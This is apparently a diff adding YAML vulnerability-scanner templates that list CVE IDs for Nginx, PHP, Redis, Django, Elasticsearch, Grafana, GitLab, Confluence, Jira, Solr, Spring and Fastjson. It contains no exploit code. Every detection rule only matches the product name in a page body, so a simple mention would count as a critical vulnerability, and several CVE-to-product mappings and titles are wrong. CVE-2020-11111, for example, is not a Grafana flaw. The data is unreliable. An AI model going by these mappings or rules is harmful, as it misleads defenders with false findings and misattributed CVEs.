+  cve: CVE-2018-16852
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Nginx"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-16852"]
+    cpe: "cpe:2.3:a:nginx:nginx:*"
+    service: http
+    port: 80
+- id: CVE-2022-41741
+  name: Nginx Info Disclosure
+  severity: high
+  author: argus
+  description: "Nginx Info Disclosure - CVE-2022-41741"
+  cve: CVE-2022-41741
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Nginx"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2022-41741"]
+    cpe: "cpe:2.3:a:nginx:nginx:*"
+    service: http
+    port: 80
+- id: CVE-2022-41742
+  name: Nginx Info Disclosure v2
+  severity: high
+  author: argus
+  description: "Nginx Info Disclosure v2 - CVE-2022-41742"
+  cve: CVE-2022-41742
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Nginx"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2022-41742"]
+    cpe: "cpe:2.3:a:nginx:nginx:*"
+    service: http
+    port: 80
+- id: CVE-2019-11042
+  name: PHP RCE
+  severity: critical
+  author: argus
+  description: "PHP RCE - CVE-2019-11042"
+  cve: CVE-2019-11042
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "php"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-11042"]
+    cpe: "cpe:2.3:a:php:php:*"
+    service: http
+    port: 80
+- id: CVE-2021-21702
+  name: PHP RCE v2
+  severity: critical
+  author: argus
+  description: "PHP RCE v2 - CVE-2021-21702"
+  cve: CVE-2021-21702
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "php"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-21702"]
+    cpe: "cpe:2.3:a:php:php:*"
+    service: http
+    port: 80
+- id: CVE-2021-21703
+  name: PHP RCE v3
+  severity: critical
+  author: argus
+  description: "PHP RCE v3 - CVE-2021-21703"
+  cve: CVE-2021-21703
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "php"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-21703"]
+    cpe: "cpe:2.3:a:php:php:*"
+    service: http
+    port: 80
+- id: CVE-2021-21704
+  name: PHP RCE v4
+  severity: critical
+  author: argus
+  description: "PHP RCE v4 - CVE-2021-21704"
+  cve: CVE-2021-21704
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "php"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-21704"]
+    cpe: "cpe:2.3:a:php:php:*"
+    service: http
+    port: 80
+- id: CVE-2021-21705
+  name: PHP RCE v5
+  severity: critical
+  author: argus
+  description: "PHP RCE v5 - CVE-2021-21705"
+  cve: CVE-2021-21705
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "php"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-21705"]
+    cpe: "cpe:2.3:a:php:php:*"
+    service: http
+    port: 80
+- id: CVE-2022-31625
+  name: PHP RCE v6
+  severity: critical
+  author: argus
+  description: "PHP RCE v6 - CVE-2022-31625"
+  cve: CVE-2022-31625
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "php"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2022-31625"]
+    cpe: "cpe:2.3:a:php:php:*"
+    service: http
+    port: 80
+- id: CVE-2022-31626
+  name: PHP RCE v7
+  severity: critical
+  author: argus
+  description: "PHP RCE v7 - CVE-2022-31626"
+  cve: CVE-2022-31626
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "php"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2022-31626"]
+    cpe: "cpe:2.3:a:php:php:*"
+    service: http
+    port: 80
+- id: CVE-2022-31631
+  name: PHP RCE v8
+  severity: critical
+  author: argus
+  description: "PHP RCE v8 - CVE-2022-31631"
+  cve: CVE-2022-31631
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "php"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2022-31631"]
+    cpe: "cpe:2.3:a:php:php:*"
+    service: http
+    port: 80
+- id: CVE-2023-0662
+  name: PHP RCE v9
+  severity: critical
+  author: argus
+  description: "PHP RCE v9 - CVE-2023-0662"
+  cve: CVE-2023-0662
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "php"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2023-0662"]
+    cpe: "cpe:2.3:a:php:php:*"
+    service: http
+    port: 80
+- id: CVE-2018-11218
+  name: Redis RCE
+  severity: critical
+  author: argus
+  description: "Redis RCE - CVE-2018-11218"
+  cve: CVE-2018-11218
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Redis"
+  metadata:
+    category: known_cve
+    tags: ["cve", "redis", "CVE-2018-11218"]
+    cpe: "cpe:2.3:a:redis:redis:*"
+    service: redis
+    port: 6379
+- id: CVE-2018-11219
+  name: Redis DoS
+  severity: high
+  author: argus
+  description: "Redis DoS - CVE-2018-11219"
+  cve: CVE-2018-11219
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Redis"
+  metadata:
+    category: known_cve
+    tags: ["cve", "redis", "CVE-2018-11219"]
+    cpe: "cpe:2.3:a:redis:redis:*"
+    service: redis
+    port: 6379
+- id: CVE-2020-13703
+  name: Redis RCE v2
+  severity: critical
+  author: argus
+  description: "Redis RCE v2 - CVE-2020-13703"
+  cve: CVE-2020-13703
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Redis"
+  metadata:
+    category: known_cve
+    tags: ["cve", "redis", "CVE-2020-13703"]
+    cpe: "cpe:2.3:a:redis:redis:*"
+    service: redis
+    port: 6379
+- id: CVE-2022-31144
+  name: Redis DoS v2
+  severity: high
+  author: argus
+  description: "Redis DoS v2 - CVE-2022-31144"
+  cve: CVE-2022-31144
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Redis"
+  metadata:
+    category: known_cve
+    tags: ["cve", "redis", "CVE-2022-31144"]
+    cpe: "cpe:2.3:a:redis:redis:*"
+    service: redis
+    port: 6379
+- id: CVE-2023-25155
+  name: Redis RCE v3
+  severity: critical
+  author: argus
+  description: "Redis RCE v3 - CVE-2023-25155"
+  cve: CVE-2023-25155
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Redis"
+  metadata:
+    category: known_cve
+    tags: ["cve", "redis", "CVE-2023-25155"]
+    cpe: "cpe:2.3:a:redis:redis:*"
+    service: redis
+    port: 6379
+- id: CVE-2017-7233
+  name: Django XSS
+  severity: medium
+  author: argus
+  description: "Django XSS - CVE-2017-7233"
+  cve: CVE-2017-7233
+  cvss: 6.1
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Django"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2017-7233"]
+    cpe: "cpe:2.3:a:djangoproject:django:*"
+    service: http
+    port: 80
+- id: CVE-2017-7234
+  name: Django XSS v2
+  severity: medium
+  author: argus
+  description: "Django XSS v2 - CVE-2017-7234"
+  cve: CVE-2017-7234
+  cvss: 6.1
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Django"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2017-7234"]
+    cpe: "cpe:2.3:a:djangoproject:django:*"
+    service: http
+    port: 80
+- id: CVE-2019-12781
+  name: Django XSS v3
+  severity: medium
+  author: argus
+  description: "Django XSS v3 - CVE-2019-12781"
+  cve: CVE-2019-12781
+  cvss: 6.1
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Django"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-12781"]
+    cpe: "cpe:2.3:a:djangoproject:django:*"
+    service: http
+    port: 80
+- id: CVE-2019-14232
+  name: Django DoS
+  severity: high
+  author: argus
+  description: "Django DoS - CVE-2019-14232"
+  cve: CVE-2019-14232
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Django"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-14232"]
+    cpe: "cpe:2.3:a:djangoproject:django:*"
+    service: http
+    port: 80
+- id: CVE-2019-14233
+  name: Django DoS v2
+  severity: high
+  author: argus
+  description: "Django DoS v2 - CVE-2019-14233"
+  cve: CVE-2019-14233
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Django"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-14233"]
+    cpe: "cpe:2.3:a:djangoproject:django:*"
+    service: http
+    port: 80
+- id: CVE-2019-14234
+  name: Django SQLi
+  severity: high
+  author: argus
+  description: "Django SQLi - CVE-2019-14234"
+  cve: CVE-2019-14234
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Django"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-14234"]
+    cpe: "cpe:2.3:a:djangoproject:django:*"
+    service: http
+    port: 80
+- id: CVE-2019-14235
+  name: Django DoS v3
+  severity: high
+  author: argus
+  description: "Django DoS v3 - CVE-2019-14235"
+  cve: CVE-2019-14235
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Django"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-14235"]
+    cpe: "cpe:2.3:a:djangoproject:django:*"
+    service: http
+    port: 80
+- id: CVE-2020-13254
+  name: Django Info Disclosure
+  severity: high
+  author: argus
+  description: "Django Info Disclosure - CVE-2020-13254"
+  cve: CVE-2020-13254
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Django"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-13254"]
+    cpe: "cpe:2.3:a:djangoproject:django:*"
+    service: http
+    port: 80
+- id: CVE-2015-5515
+  name: ES RCE
+  severity: critical
+  author: argus
+  description: "ES RCE - CVE-2015-5515"
+  cve: CVE-2015-5515
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /_search
+    match_rule:
+      match_type: Body
+      pattern: "Elasticsearch"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2015-5515"]
+    cpe: "cpe:2.3:a:elastic:elasticsearch:*"
+    service: http
+    port: 9200
+- id: CVE-2016-10387
+  name: ES RCE v2
+  severity: critical
+  author: argus
+  description: "ES RCE v2 - CVE-2016-10387"
+  cve: CVE-2016-10387
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /_search
+    match_rule:
+      match_type: Body
+      pattern: "Elasticsearch"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2016-10387"]
+    cpe: "cpe:2.3:a:elastic:elasticsearch:*"
+    service: http
+    port: 9200
+- id: CVE-2017-0499
+  name: ES RCE v3
+  severity: critical
+  author: argus
+  description: "ES RCE v3 - CVE-2017-0499"
+  cve: CVE-2017-0499
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /_search
+    match_rule:
+      match_type: Body
+      pattern: "Elasticsearch"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2017-0499"]
+    cpe: "cpe:2.3:a:elastic:elasticsearch:*"
+    service: http
+    port: 9200
+- id: CVE-2018-17243
+  name: ES RCE v4
+  severity: critical
+  author: argus
+  description: "ES RCE v4 - CVE-2018-17243"
+  cve: CVE-2018-17243
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /_search
+    match_rule:
+      match_type: Body
+      pattern: "Elasticsearch"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-17243"]
+    cpe: "cpe:2.3:a:elastic:elasticsearch:*"
+    service: http
+    port: 9200
+- id: CVE-2019-4213
+  name: ES RCE v5
+  severity: critical
+  author: argus
+  description: "ES RCE v5 - CVE-2019-4213"
+  cve: CVE-2019-4213
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /_search
+    match_rule:
+      match_type: Body
+      pattern: "Elasticsearch"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-4213"]
+    cpe: "cpe:2.3:a:elastic:elasticsearch:*"
+    service: http
+    port: 9200
+- id: CVE-2020-11111
+  name: Grafana XSS
+  severity: medium
+  author: argus
+  description: "Grafana XSS - CVE-2020-11111"
+  cve: CVE-2020-11111
+  cvss: 6.1
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Grafana"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-11111"]
+    cpe: "cpe:2.3:a:grafana:grafana:*"
+    service: http
+    port: 3000
+- id: CVE-2020-12245
+  name: Grafana RCE
+  severity: critical
+  author: argus
+  description: "Grafana RCE - CVE-2020-12245"
+  cve: CVE-2020-12245
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Grafana"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-12245"]
+    cpe: "cpe:2.3:a:grafana:grafana:*"
+    service: http
+    port: 3000
+- id: CVE-2021-39187
+  name: Grafana RCE v2
+  severity: critical
+  author: argus
+  description: "Grafana RCE v2 - CVE-2021-39187"
+  cve: CVE-2021-39187
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Grafana"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-39187"]
+    cpe: "cpe:2.3:a:grafana:grafana:*"
+    service: http
+    port: 3000
+- id: CVE-2021-39188
+  name: Grafana RCE v3
+  severity: critical
+  author: argus
+  description: "Grafana RCE v3 - CVE-2021-39188"
+  cve: CVE-2021-39188
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Grafana"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-39188"]
+    cpe: "cpe:2.3:a:grafana:grafana:*"
+    service: http
+    port: 3000
+- id: CVE-2017-0883
+  name: GitLab RCE
+  severity: critical
+  author: argus
+  description: "GitLab RCE - CVE-2017-0883"
+  cve: CVE-2017-0883
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "GitLab"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2017-0883"]
+    cpe: "cpe:2.3:a:gitlab:gitlab:*"
+    service: http
+    port: 80
+- id: CVE-2019-5413
+  name: GitLab RCE v2
+  severity: critical
+  author: argus
+  description: "GitLab RCE v2 - CVE-2019-5413"
+  cve: CVE-2019-5413
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "GitLab"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-5413"]
+    cpe: "cpe:2.3:a:gitlab:gitlab:*"
+    service: http
+    port: 80
+- id: CVE-2019-6976
+  name: GitLab RCE v3
+  severity: critical
+  author: argus
+  description: "GitLab RCE v3 - CVE-2019-6976"
+  cve: CVE-2019-6976
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "GitLab"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-6976"]
+    cpe: "cpe:2.3:a:gitlab:gitlab:*"
+    service: http
+    port: 80
+- id: CVE-2020-10811
+  name: GitLab RCE v4
+  severity: critical
+  author: argus
+  description: "GitLab RCE v4 - CVE-2020-10811"
+  cve: CVE-2020-10811
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "GitLab"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-10811"]
+    cpe: "cpe:2.3:a:gitlab:gitlab:*"
+    service: http
+    port: 80
+- id: CVE-2021-22164
+  name: GitLab RCE v5
+  severity: critical
+  author: argus
+  description: "GitLab RCE v5 - CVE-2021-22164"
+  cve: CVE-2021-22164
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "GitLab"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-22164"]
+    cpe: "cpe:2.3:a:gitlab:gitlab:*"
+    service: http
+    port: 80
+- id: CVE-2021-26084
+  name: Confluence OGNL RCE v2
+  severity: critical
+  author: argus
+  description: "Confluence OGNL RCE v2 - CVE-2021-26084"
+  cve: CVE-2021-26084
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Confluence"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-26084"]
+    cpe: "cpe:2.3:a:atlassian:confluence:*"
+    service: http
+    port: 8090
+- id: CVE-2022-26141
+  name: Confluence DoS
+  severity: high
+  author: argus
+  description: "Confluence DoS - CVE-2022-26141"
+  cve: CVE-2022-26141
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Confluence"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2022-26141"]
+    cpe: "cpe:2.3:a:atlassian:confluence:*"
+    service: http
+    port: 8090
+- id: CVE-2023-22515
+  name: Confluence RCE
+  severity: critical
+  author: argus
+  description: "Confluence RCE - CVE-2023-22515"
+  cve: CVE-2023-22515
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Confluence"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2023-22515"]
+    cpe: "cpe:2.3:a:atlassian:confluence:*"
+    service: http
+    port: 8090
+- id: CVE-2023-22518
+  name: Confluence RCE v2
+  severity: critical
+  author: argus
+  description: "Confluence RCE v2 - CVE-2023-22518"
+  cve: CVE-2023-22518
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Confluence"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2023-22518"]
+    cpe: "cpe:2.3:a:atlassian:confluence:*"
+    service: http
+    port: 8090
+- id: CVE-2019-8441
+  name: Jira RCE
+  severity: critical
+  author: argus
+  description: "Jira RCE - CVE-2019-8441"
+  cve: CVE-2019-8441
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Jira"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-8441"]
+    cpe: "cpe:2.3:a:atlassian:jira:*"
+    service: http
+    port: 8080
+- id: CVE-2019-8449
+  name: Jira RCE v2
+  severity: critical
+  author: argus
+  description: "Jira RCE v2 - CVE-2019-8449"
+  cve: CVE-2019-8449
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Jira"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-8449"]
+    cpe: "cpe:2.3:a:atlassian:jira:*"
+    service: http
+    port: 8080
+- id: CVE-2020-14179
+  name: Jira Info Disclosure
+  severity: high
+  author: argus
+  description: "Jira Info Disclosure - CVE-2020-14179"
+  cve: CVE-2020-14179
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Jira"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-14179"]
+    cpe: "cpe:2.3:a:atlassian:jira:*"
+    service: http
+    port: 8080
+- id: CVE-2020-29458
+  name: Jira RCE v3
+  severity: critical
+  author: argus
+  description: "Jira RCE v3 - CVE-2020-29458"
+  cve: CVE-2020-29458
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Jira"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-29458"]
+    cpe: "cpe:2.3:a:atlassian:jira:*"
+    service: http
+    port: 8080
+- id: CVE-2021-26086
+  name: Jira RCE v4
+  severity: critical
+  author: argus
+  description: "Jira RCE v4 - CVE-2021-26086"
+  cve: CVE-2021-26086
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Jira"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-26086"]
+    cpe: "cpe:2.3:a:atlassian:jira:*"
+    service: http
+    port: 8080
+- id: CVE-2017-3164
+  name: Solr RCE
+  severity: critical
+  author: argus
+  description: "Solr RCE - CVE-2017-3164"
+  cve: CVE-2017-3164
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /solr/
+    match_rule:
+      match_type: Body
+      pattern: "Solr"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2017-3164"]
+    cpe: "cpe:2.3:a:apache:solr:*"
+    service: http
+    port: 8983
+- id: CVE-2017-3166
+  name: Solr RCE v2
+  severity: critical
+  author: argus
+  description: "Solr RCE v2 - CVE-2017-3166"
+  cve: CVE-2017-3166
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /solr/
+    match_rule:
+      match_type: Body
+      pattern: "Solr"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2017-3166"]
+    cpe: "cpe:2.3:a:apache:solr:*"
+    service: http
+    port: 8983
+- id: CVE-2019-17558
+  name: Solr RCE v3
+  severity: critical
+  author: argus
+  description: "Solr RCE v3 - CVE-2019-17558"
+  cve: CVE-2019-17558
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /solr/
+    match_rule:
+      match_type: Body
+      pattern: "Solr"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-17558"]
+    cpe: "cpe:2.3:a:apache:solr:*"
+    service: http
+    port: 8983
+- id: CVE-2021-27905
+  name: Solr RCE v4
+  severity: critical
+  author: argus
+  description: "Solr RCE v4 - CVE-2021-27905"
+  cve: CVE-2021-27905
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /solr/
+    match_rule:
+      match_type: Body
+      pattern: "Solr"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-27905"]
+    cpe: "cpe:2.3:a:apache:solr:*"
+    service: http
+    port: 8983
+- id: CVE-2021-29443
+  name: Solr RCE v5
+  severity: critical
+  author: argus
+  description: "Solr RCE v5 - CVE-2021-29443"
+  cve: CVE-2021-29443
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /solr/
+    match_rule:
+      match_type: Body
+      pattern: "Solr"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-29443"]
+    cpe: "cpe:2.3:a:apache:solr:*"
+    service: http
+    port: 8983
+- id: CVE-2018-1271
+  name: Spring RCE
+  severity: critical
+  author: argus
+  description: "Spring RCE - CVE-2018-1271"
+  cve: CVE-2018-1271
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Spring"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-1271"]
+    cpe: "cpe:2.3:a:pivotal_software:spring_framework:*"
+    service: http
+    port: 80
+- id: CVE-2018-1272
+  name: Spring RCE v2
+  severity: critical
+  author: argus
+  description: "Spring RCE v2 - CVE-2018-1272"
+  cve: CVE-2018-1272
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Spring"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-1272"]
+    cpe: "cpe:2.3:a:pivotal_software:spring_framework:*"
+    service: http
+    port: 80
+- id: CVE-2018-1273
+  name: Spring RCE v3
+  severity: critical
+  author: argus
+  description: "Spring RCE v3 - CVE-2018-1273"
+  cve: CVE-2018-1273
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Spring"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-1273"]
+    cpe: "cpe:2.3:a:pivotal_software:spring_framework:*"
+    service: http
+    port: 80
+- id: CVE-2018-1275
+  name: Spring RCE v4
+  severity: critical
+  author: argus
+  description: "Spring RCE v4 - CVE-2018-1275"
+  cve: CVE-2018-1275
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Spring"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-1275"]
+    cpe: "cpe:2.3:a:pivotal_software:spring_framework:*"
+    service: http
+    port: 80
+- id: CVE-2020-5398
+  name: Spring RCE v5
+  severity: critical
+  author: argus
+  description: "Spring RCE v5 - CVE-2020-5398"
+  cve: CVE-2020-5398
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Spring"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-5398"]
+    cpe: "cpe:2.3:a:pivotal_software:spring_framework:*"
+    service: http
+    port: 80
+- id: CVE-2022-25847
+  name: Fastjson RCE v3
+  severity: critical
+  author: argus
+  description: "Fastjson RCE v3 - CVE-2022-25847"
+  cve: CVE-2022-25847
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "fastjson"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2022-25847"]
+    cpe: "cpe:2.3:a:alibaba:fastjson:*"
+    service: http
+    port: 80
+- id: CVE-2022-25849
+  name: Fastjson RCE v4
+  severity: critical
+  author: argus
+  description: "Fastjson RCE v4 - CVE-2022-25849"
+  cve: CVE-2022-25849
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "fastjson"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2022-25849"]
